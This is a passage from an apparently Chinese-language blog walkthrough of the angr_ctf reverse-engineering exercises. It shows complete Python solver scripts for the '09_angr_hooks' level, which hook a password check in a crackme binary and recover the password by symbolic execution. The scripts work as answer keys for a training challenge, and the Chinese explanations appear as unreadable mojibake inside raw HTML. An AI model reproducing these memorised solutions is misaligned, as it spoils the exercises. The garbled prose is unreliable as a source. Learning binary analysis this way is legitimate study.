class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¯¥è„šæœ¬ä½¿ç”¨ Angr å·¥å…·è‡ªåŠ¨åŒ–è§£å†³äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å¯†ç é—®é¢˜ã€‚å®ƒé¦–å…ˆåŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨  <code>angr.Project()</code>  åˆ›å»ºä¸€ä¸ªé¡¹ç›®å¯¹è±¡ã€‚æ¥ä¸‹æ¥ï¼Œå®ƒä½¿ç”¨åˆå§‹çŠ¶æ€åˆ›å»ºä¸€ä¸ªç¬¦å·å˜é‡  <code>password</code> ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨åœ°å€  <code>0x804a040</code>  ä¸­ã€‚ç„¶åï¼Œå®ƒä½¿ç”¨  <code>project.factory.simgr()</code>  åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿå™¨å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç”¨äºæ¢ç´¢çŠ¶æ€ç©ºé—´ä»¥æ‰¾åˆ°ç›®æ ‡çŠ¶æ€ã€‚æ¥ç€ï¼Œå®ƒæ¢ç´¢çŠ¶æ€ç©ºé—´ä»¥æ‰¾åˆ°ç‰¹å®šåœ°å€  <code>0x8048683</code> ï¼Œè¯¥åœ°å€æ£€æŸ¥å¯†ç æ˜¯å¦æ­£ç¡®ã€‚<strong>å¦‚æœæ‰¾åˆ°ç›®æ ‡çŠ¶æ€ï¼Œåˆ™æ·»åŠ çº¦æŸæ¡ä»¶ï¼Œä½¿  <code>constrained_parameter_bitvector</code>  ç­‰äºé¢„æœŸå€¼ã€‚æœ€åï¼Œå®ƒä½¿ç”¨  <code>solver.eval()</code>  æ±‚è§£çº¦æŸæ¡ä»¶</strong>ï¼Œå¹¶æ‰“å°å‡ºè§£å†³æ–¹æ¡ˆã€‚å¦‚æœæ‰¾ä¸åˆ°è§£å†³æ–¹æ¡ˆï¼Œåˆ™ä¼šå¼•å‘å¼‚å¸¸ã€‚</p>\n<h3 id=\"09_angr_hooks\"><a class=\"markdownIt-Anchor\" href=\"#09_angr_hooks\">#</a> 09_angr_hooks</h3>\n<p><s>ä¹‹å‰ä¸‰é¢å­¦è¿‡ inline hook ä½†è¿˜æ²¡å’‹åº”ç”¨è¿‡</s></p>\n<p>å­¦ä¹ ä½¿ç”¨ angr çš„ hook æŠ€æœ¯è§£å†³è·¯å¾„çˆ†ç‚¸é—®é¢˜ï¼Œä¸åˆšåˆšåˆ©ç”¨çš„çº¦æŸæ¡ä»¶ä¸åŒï¼Œhook æŠ€æœ¯åˆ™æ›´ä¸ºå¼ºå¤§ï¼</p>\n<h4 id=\"hook\"><a class=\"markdownIt-Anchor\" href=\"#hook\">#</a> Hook</h4>\n<p>angr æä¾›äº†ç®€ä¾¿çš„ Hook æ¥å£ï¼Œèƒ½å¤Ÿç”¨äº Hook è¢« angr æ¨¡æ‹Ÿæ‰§è¡Œçš„ç¨‹åºï¼Œå®ƒé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>\n<ul>\n<li>\n<p>è£…é¥°å™¨ @project.hook</p>\n</li>\n<li>\n<p>å‡½æ•° project.hook_symbol</p>\n<p>è£…é¥°å™¨:</p>\n</li>\n</ul>\n<pre><code>@project.hook(0x80486B3, length=5)\n</code></pre>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°å³éœ€è¦ Hook çš„è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•° length å³æŒ‡å®šæ‰§è¡Œå¼•æ“åœ¨å®ŒæˆæŒ‚é’©ååº”è·³è¿‡å¤šå°‘å­—èŠ‚ã€‚å…·ä½“å¤šå°‘å­—èŠ‚ç”± Hook å¤„åœ°å€çš„æŒ‡ä»¤é•¿åº¦ç¡®å®š</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804A054</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            user_input_buffer_length</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'XKSPZSJKJYQCQXZV'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        register_size_bit <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">)</span><span class=\"token comment\">#ä¸å†å¾ªç¯äº†</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>è„šæœ¬</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./09_angr_hooks\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\"># Since Angr can handle the initial call to scanf, we can start from the</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\"># beginning.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\"># Hook the address of where check_equals_ is called.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  check_equals_called_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486ca</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\"># The length parameter in angr.Hook specifies how many bytes the execution</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\"># engine should skip after completing the hook. This will allow hooks to</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\"># replace certain instructions (or groups of instructions). Determine the</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\"># instructions involved in calling check_equals_, and then determine how many</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\"># bytes are used to represent them in memory. This will be the skip length.</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  instruction_to_skip_length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a044</span> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      user_input_buffer_length</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># :string</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token comment\"># Since we are allowing Angr to handle the input, retrieve it by printing</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\"># the contents of stdin. Use one of the early levels as a reference.</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨äº† angr å·¥å…·åŒ…æ¥é€šè¿‡ç¬¦å·æ‰§è¡Œè§£å†³ç¨‹åºçš„é€†å‘åˆ†æé—®é¢˜ã€‚é¦–å…ˆå®šä¹‰äº†ç¨‹åºè·¯å¾„ path_to_binaryï¼Œç„¶åä½¿ç”¨ angr.Project å‡½æ•°å°†å…¶è½½å…¥åˆ° angr ä¸­ã€‚æ¥ç€ä½¿ç”¨ project.factory.entry_state åˆ›å»ºäº†ä¸€ä¸ªåˆå§‹çŠ¶æ€ initial_stateï¼Œè¯¥çŠ¶æ€åŒ…å«äº†ç¨‹åºçš„èµ·å§‹ä¿¡æ¯ã€‚ç„¶åï¼Œä½¿ç”¨ project.hook å‡½æ•°æ¥æ³¨å†Œäº†ä¸€ä¸ªé’©å­å‡½æ•°ï¼Œè¯¥é’©å­å‡½æ•°ç”¨äºæ‹¦æˆªåˆ°å‡½æ•° check_equals_çš„è°ƒç”¨ï¼Œå¹¶ä¿®æ”¹å…¶è¿”å›å€¼ã€‚åœ¨é’©å­å‡½æ•°ä¸­ï¼Œé¦–å…ˆç¡®å®šäº†ç”¨æˆ·è¾“å…¥çš„åœ°å€å’Œé•¿åº¦ï¼Œå¹¶ä½¿ç”¨ state.memory.load æ–¹æ³•ä»ç”¨æˆ·è¾“å…¥çš„åœ°å€ä¸­è¯»å–å‡ºç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚æ¥ç€ç¡®å®šäº†éœ€è¦ä¸ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒçš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ claripy åº“ä¸­çš„ If æ–¹æ³•æ¥åˆ¤æ–­ä¸¤è€…æ˜¯å¦ç›¸ç­‰ï¼Œä»è€Œä¿®æ”¹ eax å¯„å­˜å™¨ä¸­çš„å€¼ã€‚æœ€åï¼Œä½¿ç”¨ project.factory.simgr å‡½æ•°æ¥åˆ›å»ºäº†ä¸€ä¸ªç¬¦å·æ‰§è¡Œå™¨ simulationï¼Œå¹¶ä½¿ç”¨å…¶ explore æ–¹æ³•æ¥æ¢ç´¢ç¬¦å·æ‰§è¡Œçš„çŠ¶æ€ç©ºé—´ï¼Œç›´åˆ°æ‰¾åˆ°æ»¡è¶³ is_successful æ¡ä»¶çš„çŠ¶æ€æˆ–é¿å… should_abort æ¡ä»¶çš„çŠ¶æ€ã€‚å¦‚æœæ‰¾åˆ°äº†æ»¡è¶³æ¡ä»¶çš„çŠ¶æ€ï¼Œåˆ™ä»è¯¥çŠ¶æ€ä¸­è·å–è§£å†³æ–¹æ¡ˆï¼Œå¹¶æ‰“å°è¾“å‡ºã€‚å¦åˆ™ï¼ŒæŠ›å‡ºå¼‚å¸¸å¹¶æç¤ºæ— æ³•æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚</p>\n<p><strong>å¦ä¸€ä¸ªç‰ˆæœ¬</strong> (å…¶å®å·®ä¸å¤š)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./09_angr_hooks\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    check_equals_called_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486CA</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    instruction_to_skip_length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804A044</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            user_input_buffer_length</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        register_size_bit <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span>  stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token 